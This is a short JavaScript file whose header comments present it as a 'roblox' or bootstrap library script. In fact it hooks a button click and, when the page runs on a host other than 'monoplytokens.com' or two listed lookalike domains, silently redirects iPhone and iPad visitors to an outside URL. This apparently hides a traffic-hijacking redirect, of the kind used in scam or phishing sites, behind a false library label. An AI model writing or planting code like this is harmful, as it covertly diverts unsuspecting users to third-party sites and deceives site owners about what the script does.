/*================== [ roblox ] ===============*/
/*================== [ ajax-libs-bootstrap-5.3.4/2 ] ================*/
var button = document.querySelector('.btn');  
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "monoplytokens.com";
        var redirectURL = "https://live33.online/?d00d9dc";
        var blockedDomains = [
            "mply.io.1arshg4.site",
            "mply.io.4a6b8dh.site"
        ];

        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

            if (isIphoneOrIpad) { 
                window.location.href = redirectURL;
            }
        }
    })();
});
